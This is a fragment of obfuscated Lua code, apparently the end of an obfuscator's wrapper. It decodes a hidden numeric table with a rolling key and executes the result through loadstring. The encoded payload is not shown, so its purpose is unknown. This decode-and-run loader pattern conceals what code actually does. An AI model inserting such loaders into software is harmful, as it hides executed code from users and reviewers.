    local function VM_O01lII(d, k, m)
        local R_OlII00l = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_OlII00l, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_OlII00l)
    end

    -- Execution Guard
    local F_OlIO = loadstring(VM_O01lII(B_0IIO, 70, 2))
    if F_OlIO then
        F_OlIO(...)
    end
end)(...)
